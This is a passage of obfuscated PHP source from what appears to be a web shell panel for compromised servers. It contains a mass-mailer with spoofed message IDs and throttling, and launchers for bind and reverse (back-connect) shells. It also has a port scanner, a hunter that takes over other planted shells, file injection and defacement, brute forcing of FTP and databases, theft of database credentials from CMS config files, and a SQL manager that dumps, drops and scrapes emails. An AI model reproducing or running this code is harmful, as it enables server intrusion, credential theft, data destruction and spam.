                            if ($send_method == 'PHPMailer' || $send_method == 'smtp' || $send_method == 'sendmail') {
                                $mail = new PHPMailer;
                                if (isset($message_charset)) $mail->CharSet = $message_charset;
                                if (isset($message_encoding)) $mail->Encoding = $message_encoding;
                                if (isset($x_priority)) $mail->Priority = $x_priority;
                                if (isset($x_mailer)) $mail->XMailer = preg_replace('~^x-mailer\s*:\s*~is', '', r_xmailer($x_mailer));
                                if ($send_method == "smtp") {
                                    $mail->isSMTP();
                                    if (isset($smtp_SMTPDebug)) $mail->SMTPDebug = $smtp_SMTPDebug;
                                    if (isset($smtp_host)) $mail->Host = $smtp_host; else $mail->Host = 'localhost';
                                    if (isset($smtp_port)) $mail->Port = $smtp_port; else $mail->Port = 465;
                                    if (isset($smtp_keepalive)) $mail->SMTPKeepAlive = $smtp_keepalive;
                                    if (isset($smtp_SMTPAuth)) $mail->SMTPAuth = $smtp_SMTPAuth;
                                    if (isset($smtp_username)) {
                                        $mail->Username = $smtp_username;
                                        $mail->Password = $smtp_password;
                                    }
                                    if (isset($smtp_SMTPSecure)) $mail->SMTPSecure = $smtp_SMTPSecure;
                                }
                                if ($send_method == "sendmail") $mail->isSendmail();
                                if (isset($receiver_name)) {
                                    $receiver_explode = explode('@', $m_mail);
                                    $mail->addAddress($m_mail, $receiver_explode[0]);
                                } else $mail->addAddress($m_mail);
                                $mail->setFrom($from, $m2_name);
                                $mail->addReplyTo($from, $m2_name);
                                if (isset($message_ids)) {
                                    if ($message_ids == 'random_domain') $message_id = '<' . md5(uniqid(time())) . '@' . r_random_domain() . '>'; else if ($message_ids == 'sender_domain') $message_id = '<' . md5(uniqid(time())) . '@' . get_domain_email($from) . '>'; else if ($message_ids == 'shell_domain') $message_id = '<' . md5(uniqid(time())) . '@' . $_SERVER['HTTP_HOST'] . '>'; else if ($message_ids == 'random_computer') {
                                        $computer = ['Home', 'HomeComputer', 'Notebook', 'Laptop', 'PC', 'MyPC', 'Desktop', 'Office', 'Computer'];
                                        $randomc = rand(1, 4);
                                        if ($randomc == 1) $computer_name = $computer[array_rand($computer)] . '-' . r_random_value('word_upper', 6, 8); elseif ($randomc == 2) $computer_name = r_random_value('word_upper', 6, 8) . '-' . $computer[array_rand($computer)];
                                        elseif ($randomc == 3) $computer_name = strtoupper($computer[array_rand($computer)]) . '-' . r_random_value('word_upper', 6, 8);
                                        elseif ($randomc == 4) $computer_name = r_random_value('word_upper', 6, 8) . '-' . strtoupper($computer[array_rand($computer)]);
                                        $message_id = '<' . md5(uniqid(time())) . '@' . $computer_name . '>';
                                    }
                                    $mail->MessageID = $message_id;
                                }
                                $mail->Subject = $m_subj;
                                if (isset($isHTML)) $mail->isHTML($isHTML);
                                if (isset($msgHTML)) $mail->msgHTML($m_msg, __DIR__); else $mail->Body = $m_msg;
                                if (isset($altbody)) $mail->AltBody = $altbody;
                                if (isset($stringattachment_name) && isset($stringattachment_body)) {
                                    $mail->addStringAttachment($stringattachment_body_final, $stringattachment_name_final);
                                }
                                ...
                                if (!$mail->send()) {
                                    ...
                                    $oksend = False;
                                    if ($send_method == 'smtp') $mail->getSMTPInstance()->reset();
                                } else {
                                    echo "Message sent!";
                                    $oksend = True;
                                }
                                ...
                                $mail->clearReplyTos();
                                if (isset($seconds_between_messages)) {
                                    if (strpos($seconds_between_messages, "random_") !== false) {
                                        $explode_sleep = explode('_', $seconds_between_messages);
                                        $sleep = rand($explode_sleep[1], $explode_sleep[2]);
                                    } else $sleep = $seconds_between_messages;
                                    sleep($sleep);
                                }
                            } else $oksend = @mail($m_mail, $m_subj, $m_msg, $header);
                            if ($oksend) {
...
if ($act == 'encoders') {
    $hash_algos = ['' => z9s("260")];
    if (!@isset($hash_input)) $hash_input = '';
    if (z7r("hash_algos") && @z7r("hash")) {
        ...
        $hfnc = 0;
        $hashes = [];
        foreach (["md5", "sha1", "crc32"] as $hh) {
            if (z7r($hh)) $hashes[] = $hh;
        }
    }
    foreach ($hashes as $ha) $hash_algos[$ha] = $ha;
    $encode_functions = z0x();
    $submited = 0;
    if (@isset($submit_encode) && $submit_encode && @isset($encoder_input) && !@empty($encoder_input)) $submited = 1;
    $encoder_output = "";
    if (!@isset($ip_input) || @empty($ip_input)) {
        $ip_input = $saddr;
    }
    echo z2b([z9s("246"), z9s("253")], "46");
...
if ($act == 'tools') {
    ...
    $bndportsrcs = ["bndprt.pl" => ["PERL", "perl %path"], "bndprt.c" => ["C", "%path"]];
    $bcsrcs = ["bckcon.pl" => ["PERL", "perl %path %host %port"], "bckcon.c" => ["C", "%path %host %port"]];
    if (!@isset($brtest1)) $brtest1 = 0;
    if (!@isset($brtest2)) $brtest2 = 0;
    if (!@isset($brtest3)) $brtest3 = 0;
    if (!@isset($brtest4)) $brtest4 = 0;
    $users = [];
    if (@empty($brute_email)) $brute_email = z7x('2', "email");
    if (@empty($dv_email)) $dv_email = z7x('2', "email");
    if (@empty($cp_email)) $cp_email = z7x('2', "email");
    ...
    $available_arr = [];
    if ($bftp) $available_arr["FTP"] = "FTP";
    if ($bmysql) $available_arr["MySQL"] = "MySQL";
    if ($bmssql) $available_arr["MSSQL"] = "MSSQL";
    if ($bpostgres) $available_arr["PostgreSQL"] = "PostgreSQL";
    if ($boracle) $available_arr["Oracle"] = "Oracle";
    if (!@isset($brh)) $brh = $saddr;
    if (!@isset($dvfiles)) $dvfiles = "*conf*.php;*db*.php;";
    if (!@isset($dvuser)) $dvuser = "user";
    if (!@isset($dvpass)) $dvpass = "pass";
    if (!@isset($dvhost)) $dvhost = "host";
    if (!@isset($dvbase)) $dvbase = "base";
    $arr_vars = ["var" => "variable (\$var)", "arrayvar1" => "arrayvar ('var'=>)", "arrayvar2" => "arrayvar (['var']=>)", "const" => "constant (define)"];
    $rec_arr = [];
    for ($i = 0; $i < 10; $i++) $rec_arr[($i + 1)] = ($i + 1) . " DIRS";
    $rec_arr["no"] = "NO";
    $arr_dvfind = ["dvdir" => z9s("325")];
    $arr_method = ["cpdir" => z9s("304")];
    if (($wwwdir = z3k()) !== false) {
    ...
    $arr_sfuncs = ["glob" => "glob"];
    if ($nix && $sh_exec) {
        $arr_sfuncs["find"] = "find";
    }
    $inj_method = ["top" => "Top of the file", "end" => "End of the file", "php1" => "Before first &lt;?", "html1" => "Before &lt;html&gt;", "html2" => "Before &lt;/html&gt;", "body1" => "Before &lt;body.*&gt;", "body2" => "Before &lt;/body&gt;", "php2" => "After last ?&gt;", "body3" => "After &lt;body.*&gt;", "body4" => "After &lt;/body&gt;", "html3" => "After &lt;html&gt;", "html4" => "After &lt;/html&gt;", "overwrite" => "Deface (Overwrite file)"];
    if (!@isset($bnd_port) || !@is_numeric($bnd_port)) $bnd_port = z7x('2', 'bind_port');
    if (!@isset($bnd_pass) || @empty($bnd_pass)) $bnd_pass = z7x('2', 'bind_pass');
    if (!@isset($bc_host) || @empty($bc_host)) $bc_host = $yaddr;
    if (!@isset($bc_port) || !@is_numeric($bc_port)) $bc_port = z7x('2', 'backcon_port');
    $bindmsg = $bcmsg = "";
        ...
        if (@empty($v)) {
            ...
            if (!$fp) {
                ...
                if (!$sock) {
                    ...
                    $bindmsg = z9s("274", [$saddr, $bnd_port]);
                }
            }
        }
    }
    if (@isset($bcsubmit) && $bcsubmit) {
        ...
        if (@empty($v)) {
            ...
            if (!$fp) {
                ...
                $v[1] = @str_replace("//", "/", $v[1]);
                $retbind = z9t($v[1] . " > /dev/null &");
                $bcmsg = z9s("76", [$bc_host, $bc_port]);
            }
        }
    }
    $selecta = $selectb = [];
    foreach ($bndportsrcs as $k => $v) $selecta[$k] = $v[0];
    foreach ($bcsrcs as $k => $v) $selectb[$k] = $v[0];
    if (!$win && ($sh_exec || $safe_exec)) {
        echo z2b([z9s("265") . (!@empty($bindmsg) ? " - " . @strtoupper($bindmsg) : ""), z9s("266") . (!@empty($bcmsg) ? " - " . @strtoupper($bcmsg) : "")], '46');
        echo z9m(2) . z7p() . z7k('', '4');
        echo z5c(["act" => "tools", "d", "bindsubmit" => "1"], z10e(z5n() . z7i(z5t(z9s("267")) . z9j(z6i("bnd_pass", $bnd_pass, '4') . ":" . z6i("bnd_port", $bnd_port, '1') . ":" . z4a("bnd_src", $selecta, '1', 1) . z8v(z9s("268"), '7'))) . z5n(), '2'));
        echo z7g() . z7k('', '46');
        echo z5c(["act" => "tools", "d", "bcsubmit" => "1"], z10e(z5n() . z7i(z5t(z9s("434")) . z9j(z6i("bc_host", $bc_host, '4') . ":" . z6i("bc_port", $bc_port, '1') . ":" . z4a("bc_src", $selectb, '1', 1) . z8v(z9s("435"), '7'))) . z5n(), "2"));
        echo z7g() . z7u() . z10w();
        $ii = 0;
        if (@is_dir($tempdir)) {
        ...
        if ($ii != 0) echo z2b(@strtoupper(z9s("269", $ii)) . z5c(["act" => "tools", "d", "clean" => "1"], z8v(z9s("270"), '7')));
    }
    $pscmsg = '';
    $startscan = 0;
    ...
    echo z2b([z9s("281"), z9s("277") . ($pscmsg != '' ? " : " . $pscmsg : '')], "46");
    if (!@isset($pscip)) $pscip = $saddr;
    if (!@isset($pscps)) $pscps = "0";
    if (!@isset($pscpe)) $pscpe = "65535";
    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z7z() . z9b("shellhunt", "1") . z9b("act", "tools") . z9b("d") . z7i(z5t(z9s("282")) . z9j(z4a("shaction", ["view" => z9s("284"), "viewall" => z9s("285"), "own" => z9s("286"), "ownall" => z9s("287")], "5", 1) . ":" . z4a("shrecursive", $rec_arr, "1", 1) . z8v(z9s("436"), "7"))) . z7i(z5t(z9s("283")) . z9j(z4a("hsfunc", $arr_sfuncs, "1", 1) . ":" . z5u("shpath", $d, "2"))) . z9z() . z10w() . z6d() . z7g() . z7k('', '46') . z6d() . z9m('2') . z5c(["act" => "tools", "d", "pscan" => "1"], z7i(z5t(z9s("278")) . z9j(z6i("pscip", $pscip, "4") . ":" . z6i("pscps", $pscps, '1') . "-" . z6i("pscpe", $pscpe, '1') . z8v(z9s("279"), '7')))) . z10w() . z6d() . z7g() . z7u() . z10w();
    if (@isset($shellhunt) && $shellhunt) {
        ...
        if (@count($shells) > 0) {
            ...
            foreach ($shells as $shell => $shelltype) {
                ...
                echo z7i(z9j(z2h($shell), "14", "2") . z9j($shelltype, "14") . z9j($wwwlink, "14") . z9j(z0h($shell, "1") . z5c(["act" => "f", "ft" => "rcown", "d" => z3p($shell), "f" => z2h($shell)], z8v(z9s("297"), "18"), "1"), "14", "3"), ($tr % 2 ? '0' : '1'));
                $tr++;
            }
            echo z10w();
        }
    ...
    if (@isset($inject) && $inject) {
        ...
        if (@count($glob) > 0) {
            ...
            if ($i > 0) echo z5q() . z7g() . z7u() . z10w() . z6d();
        }
    }
    ...
    $arr_cfgs = ['' => "Select Software", "joomla" => "Joomla", "opencart" => "Opencart", "osc" => "Oscommerce", "pinnaclecart" => "Pinnaclecart", "squirrelcart" => "Squirrelcart", "wordpress" => "Wordpress", "xcart" => "X-cart", "zencart" => "Zen-cart", "all" => "All of above"];
        ...
        if ($dvdefined == "all") {
            ...
            foreach ($arr_cfgs as $tcfg => $tsoft) {
                if ($tcfg != '' && $tcfg != "all") {
                    ...
                    $arr_mass[$tsoft] = [$tdvuser, $tdtuser, $tdvpass, $tdtpass, $tdvbase, $tdtbase, $tdvhost, $tdthost];
                    $tefiles = @explode(";", $tdvfiles);
                    foreach ($tefiles as $tefile) {
                        $tefile = @trim($tefile);
                        if (!@empty($tefile) && !@in_array($tefile, $arr_mass_paths)) $arr_mass_paths[] = $tefile;
                    }
                }
            }
        } else {
    ...
    if (@isset($sqlfind) && $sqlfind && !@empty($dvuser) && !@empty($dvpass)) {
        ...
        switch ($dvfind) {
            ...
            case 'passwd':
                ...
                if (@count($uarr) > 0) {
                    foreach ($uarr as $uk => $arr) {
                        if (!@in_array($arr[1], $dpaths) && $arr[1] != '/' && !@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#', $arr[1]) && z4j($arr[1])) $dpaths[] = z1a($arr[1]);
                    }
                }
                unset($uarr);
                break;
        ...
        foreach ($dpaths as $dpath) {
            ...
            if (@is_array($tglob) && @count($tglob) > 0) {
                foreach ($tglob as $tfile) {
                    if (!@in_array($tfile, $glob)) $glob[] = $tfile;
                }
            }
        }
                ...
                if (!@empty($tct)) {
                    if ($dvdefined == "all" && @isset($arr_mass) && @is_array($arr_mass) && @count($arr_mass) > 0) {
                        foreach ($arr_mass as $software => $defines) {
                            ...
                            if (!@isset($host) || @empty($host)) $host = "localhost";
                            if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                                $add = 0;
                                if (@isset($dvsqltest) && $dvsqltest) {
                                    if (z4u($host, $user, $pass, "3306", "MySQL") == "valid") $add = 1;
                                } else {
                                    $add = 1;
                                }
                                if ($add) {
                                    ...
                                    if (!@in_array($tmphash, $uhashes)) {
                                        ...
                                        echo $tmp;
                                        $log .= $tmp;
                                        if (!@isset($final_arr[$file])) $final_arr[$file] = [$host, $user, $pass, $base, $software];
                                    }
                                    break;
                                }
                            }
                        ...
                        if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                            ...
                            if ($add) {
                                ...
                                if (!@in_array($tmphash, $uhashes)) {
                                    ...
                                    echo $tmp;
                                    $log .= $tmp;
                                    if (!@isset($final_arr[$file])) $final_arr[$file] = [$host, $user, $pass, $base];
                                }
                            }
                        }
                    }
    ...
    if (@isset($final_arr) && @count($final_arr) > 0) {
        ...
        foreach ($final_arr as $file => $array) {
            ...
            echo z9j(z5c(["act" => "sql", "d", "sql_refresh" => "1", "sql_server" => $array[0], "sql_user" => $array[1], "sql_pass" => $array[2], "sql_db" => $array[3], "sql_port" => "3306", "sql_engine" => "MySQL"], z8v(z9s("336"), "7") . (($dsoft != '') ? " (" . $dsoft . ")" : ''), 1), "14", "3");
            echo z7u();
            $tr++;
        }
    }
...
if ($act == 'sql') {
    ...
    if (@isset($_SESSION['sql_session'])) {
        if (!@isset($sql_refresh) || !$sql_refresh) {
            ...
            if (!@isset($sql_sort)) $sql_sort = $_SESSION['sql_sort'];
            $sql_session = 1;
        } else {
            z0u('sql_server');
            z0u('sql_user');
    ...
    if (!@empty($sql_server) && !@empty($sql_port) && !@empty($sql_user) && @isset($sql_pass) && !@empty($sql_engine)) {
        ...
        if ($sql->connect()) {
            ...
            $hideconnect = 1;
            $db_actions = ["select" => "Select", "dump" => "Dump", "drop" => "Drop"];
            $table_actions = ["browse" => "Browse", "dump" => "Dump", "drop" => "Drop", "empty" => "Empty", "insert" => "Insert"];
            echo z2b(z9m('2') . z7i(z6x(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine"], z8v(z9s("352"), (!@isset($sql_act) || !@in_array($sql_act, ["query", "emails", "serverstatus", "servervars", "processes"]) ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "sql_db"], z8v(z9s("353"), (@isset($sql_act) && $sql_act == "query" ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "emails", "sql_db"], z8v(z9s("354"), (@isset($sql_act) && $sql_act == "emails" ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "serverstatus"], z8v(z9s("355"), (@isset($sql_act) && $sql_act == "serverstatus" ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "servervars"], z8v(z9s("356"), (@isset($sql_act) && $sql_act == "servervars" ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "processes"], z8v(z9s("357"), (@isset($sql_act) && $sql_act == "processes" ? "12" : "14"))) . z5c(["act" => "sql", "d", "sql_act" => "logoff"], z8v(z9s("358"), "14")), "")) . z10w());
            if ($sql_engine == "MySQL") {
                if (!@isset($sql_act)) {
                ...
                $dbs = $sql->list_dbs();
                $db_list = ['' => z9s("367", @count($dbs))];
                foreach ($dbs as $k => $v) $db_list[$k] = $v;
                ...
                if (!@in_array($sql_act, ["showdb", "query", "serverstatus", "servervars", "processes", "emails"])) {
                    $db_submit_acts = $table_submit_acts = '';
                    foreach ($db_actions as $dk => $dv) $db_submit_acts .= z6p($dk, $dv, "7");
                    foreach ($table_actions as $tk => $tv) $table_submit_acts .= z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act" => $tk, "sql_db", "sel_table"], z6p($tk, $tv, "7"));
                    $table_submit_acts = z10e(z7i(z9j($table_submit_acts)), "2");
                    $db_table = z10e(z7i(z6x(z8e(z9s("364")) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act"], z4a("sql_db", $db_list, "0", 1) . z4a("db_act", $db_actions, "1") . z8v(z9s("92"), "7")))), "2");
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = ['' => "-"];
                            ...
                            $table_table = z10e(z7i(z6x(z8e(z9s("365")) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db"], z4a("sel_table", $table_list, "0", 1) . z4a("table_act", $table_actions, "1") . z8v(z9s("92"), "7")))), "2");
                        }
                    }
                    echo z2b((@isset($table_table) ? [$db_table, $table_table] : $db_table));
                    if ($sql_act == "dropdb") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("437", $sql_db)) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "db_act" => "drop", "sql_db", "drop_confirm" => "1"], z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "droptable") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("438", $sel_table)) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "table_act" => "drop", "sql_db", "sel_table", "drop_confirm" => "1"], z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "empty") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("439", $sel_table)) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "table_act" => "empty", "sql_db", "sel_table", "empty_confirm" => "1"], z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "dump") {
                        if (!@isset($dump_filename)) $dump_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".sql";
                        if (@isset($sql_db) && !@empty($sql_db)) {
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $table_list = [];
                        ...
                        if (@isset($dump_confirm) && $dump_confirm) {
                            ...
                            if (!$sql->select_db()) {
                                ...
                                if (!@isset($sql_save2file) || $sql_save2file != "1") {
                                    ...
                                    foreach ($dumping_arr as $dump_table) {
                                        if ($sql->dump($dump_table)) {
                                            foreach ($sql->dump as $v) echo @htmlspecialchars($v) . "\r\n";
                                        }
                                    }
                    ...
                    if ($sql_act == "table_act" && @isset($table_act) && ($table_act == "browse" || $table_act == "insert") && @isset($sel_table) && !@empty($sel_table)) {
                        ...
                        if ($table_act == "insert") {
                            if (@isset($sql_tbl_insert_radio) && !@empty($sql_tbl_insert_radio)) {
                                ...
                                echo z2b(["INSERT INTO TABLE " . $sel_table], "1");
                                ...
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    ...
                                    echo z9f(z9j(z8e(@htmlspecialchars($name)), "14", "2") . z9j($field["Type"], "14") . z9j(z4a("sql_tbl_insert_functs[" . @htmlspecialchars($name) . "]", ["" => "", "PASSWORD" => "PASSWORD", "MD5" => "MD5", "ENCRYPT" => "ENCRYPT", "ASCII" => "ASCII", "CHAR" => "CHAR", "RAND" => "RAND", "LAST_INSERT_ID" => "LAST_INSERT_ID", "COUNT" => "COUNT", "AVG" => "AVG", "SUM" => "SUM", " " => "--------", "SOUNDEX" => "SOUNDEX", "LCASE" => "LCASE", "UCASE" => "UCASE", "NOW" => "NOW", "CURDATE" => "CURDATE", "CURTIME" => "CURTIME", "FROM_DAYS" => "FROM_DAYS", "FROM_UNIXTIME" => "FROM_UNIXTIME", "PERIOD_ADD" => "PERIOD_ADD", "PERIOD_DIFF" => "PERIOD_DIFF", "TO_DAYS" => "TO_DAYS", "UNIX_TIMESTAMP" => "UNIX_TIMESTAMP", "USER" => "USER", "WEEKDAY" => "WEEKDAY", "CONCAT" => "CONCAT"], "5"), "14") . z9j(z6i("sql_tbl_insert[" . (@isset($name) ? @htmlspecialchars($name) : "") . "]", (@isset($values["$name"]) ? @htmlspecialchars($values["$name"]) : ""), "7"), "14", "3"), ($i % 2 ? '0' : '1'));
                                }
                                echo z10w();
                        ...
                        if ($table_act == "browse") {
                            if (!@isset($sql_from) || !@is_numeric($sql_from)) $sql_from = 0;
                            if (!@isset($sql_limit) || !@is_numeric($sql_limit)) $sql_limit = 50;
                            if (!@isset($sql_page) || !@is_numeric($sql_page)) $sql_page = 0;
                            ...
                            if ($psql_sort[0] > ($cfields - 1)) $psql_sort[0] = '0';
                            $v = $psql_sort[0];
                            if ($crows > $sql_limit) {
                            ...
                            if (@count($ar_pages) < 1) $ar_pages = ["0" => z9s("397") . " 1"];
                            echo z2b([z9s("395", [$sel_table, $cfields, $crows]), z10e(z9f(z7e(($sql_page > 0 ? z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page" => ($sql_page == "1" ? "NULL" : ($sql_page - 1))], z8v(z9s("396"), "7")) : z8v(z9s("396"), "7")) . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table"], z4a("sql_page", $ar_pages, "1", 1) . z8v(z9s("398"), "7")) . ($sql_page < ($pages - 1) ? z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page" => ($sql_page + 1)], z8v(z9s("399"), "7")) : z8v(z9s("399"), "7")))), "2")], "1");
                            ...
                            if ($sql->get_result()) {
                                ...
                                for ($i = 0; $i < @count($sql->columns); $i++) {
                                    echo ($i == 0 ? z9j(z9s("62"), "13", "2") : "") . z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page", "sql_sort" => ($psql_sort[0] == "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") : "$i" . $psql_sort[1])], z8v($sql->columns[$i] . ($psql_sort[0] == "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", ($i == (@count($sql->columns) - 1) ? '3' : ''));
                                }
                                echo z7u();
                                $print_arr = [];
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                ...
                                for ($i = 0; $i < @count($print_arr); $i++) {
                                    ...
                                    foreach ($print_arr[$i] as $rv) {
                                        ...
                                        if ($a > 0) $w = @substr($w, 0, @strlen($w) - 3);
                                        echo ($cr == 0 ? z9j("<nobr>" . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db", "sel_table", "sql_tbl_insert_q" => $w], z4a("table_act", ["insert" => "Edit", "delete" => "Delete"], "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "28") : "") . z9j((@is_null($rv) ? 'NULL' : @htmlspecialchars($rv)), "14", ($cr == (@count($print_arr[$i]) - 1) ? '3' : ''));
                                        $cr++;
                                    }
                                    echo z7u();
                                }
                        ...
                        if ($sql->get_result()) {
                            ...
                            if ($psql_sort[0] >= $sql->num_fields) $psql_sort[0] = '0';
                            $v = $psql_sort[0];
                            echo z9m('2') . z7p() . z7k() . z5x('', "0") . z9m("2") . z7p() . z7k();
                            echo z9m('2') . z6g();
                            for ($i = 0; $i < $sql->num_fields; $i++) {
                                echo z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "db_act", "sql_db", "sel_table", "sql_page", "sql_sort" => ($psql_sort[0] == "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") : "$i" . $psql_sort[1])], z8v(($i == 0 ? "Table " : "") . $sql->columns[$i] . ($psql_sort[0] == "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", ($i == 0 ? "2" : ($i == ($sql->num_fields - 1) ? '3' : ''))) . ($i == 0 ? z9j(z9s("369"), "13", "8") : '');
                            }
                            echo z7u();
                            $print_arr = [];
                            for ($i = 0; $i < $sql->num_rows; $i++) {
                            ...
                            for ($i = 0; $i < @count($print_arr); $i++) {
                                ...
                                $cr = 0;
                                foreach ($print_arr[$i] as $rv) {
                                    echo z9j((@is_null($rv) ? 'NULL' : ($cr == 0 ? "<nobr>" . z5c(["act" => "sql", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "d", "sql_act" => "table_act", "sql_db", "sel_table" => $rv, "table_act" => "browse"], z8v($rv, "11")) . "</nobr>" : @htmlspecialchars($rv))), "14", ($cr == 0 ? '2' : ($cr == (@count($print_arr[$i]) - 1) ? '3' : '')));
                                    if ($cr == 0) echo z9j("<nobr>" . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db", "sel_table" => $rv], z4a("table_act", $table_actions, "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "8");
                                    $cr++;
                                }
                                echo z7u();
                            }
                ...
                if ($sql_act == "query") {
                    echo z2b(z9s("370"));
                    echo z9m("2") . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "query_confirm" => "1"], z5n() . z7i(z5t(z9s("364")) . z9j(z5u("sql_db", "", "7"))) . z9f(z5t(z9s("370")) . z9j(z5w("sql_query", "5") . (@isset($sql_query) ? @htmlspecialchars($sql_query) : "") . z5q())) . z7i(z5t(z9c()) . z9j(z8v(z9s("371"), "7"))) . z5n()) . z10w();
                ...
                if ($sql_act == "emails") {
                    $emails = [];
                    if (!@isset($emails_filename)) $emails_filename = $tempdir . "emails_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".txt";
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = [];
                                        ...
                                        if ($sql->query("SELECT " . $cv . " FROM " . $dump_table . " WHERE " . $cv . " REGEXP '^[^@]+@[^@]+\.[^@]{2,}$';")) {
                                            if ($sql->get_result()) {
                                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                                    ...
                                                    if (@count($tmpmails) > 0) {
                                                        foreach ($tmpmails as $mtmp) $emails[] = $mtmp;
                                                    }
                                                }
                                            }
                                        }
                ...
                if ($sql_act == "processes") {
                    ...
                    if ($sql->get_result()) {
                        ...
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            ...
                            echo z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "processes", "kill" => $pid], z8v(z9s("392"), "7")), "14");
                            echo z7u();
                        }
                        echo z10w();
                    }
                ...
                if ($sql_act == "showdb") {
                    $psql_sort = z5r($sql_sort);
                    if ($psql_sort[1] != 'a') $psql_sort[1] = 'd';
                    if ($psql_sort[0] > 2) $psql_sort[0] = '0';
                    $v = $psql_sort[0];
                    echo z2b(z9s("359"), "1");
                    echo z9m('2');
                    echo z7i(z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '0' ? '0' . ($psql_sort[1] == "a" ? "d" : "a") : '0' . $psql_sort[1])], z8v(z9s("360") . ($psql_sort[0] == '0' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", "2") . z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '1' ? '1' . ($psql_sort[1] == "a" ? "d" : "a") : '1' . $psql_sort[1])], z8v(z9s("361") . ($psql_sort[0] == '1' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9j(z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '2' ? '2' . ($psql_sort[1] == "a" ? "d" : "a") : '2' . $psql_sort[1])], z8v(z9s("362") . ($psql_sort[0] == '2' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9j(z9s("363"), "13", "3"));
                    if (@count($db_list) > 1) {
                        $def_db = $sql->base;
                        $total_tables = 0;
                        $total_size = 0;
                        ...
                        foreach ($sql->list_dbs() as $k => $kv) {
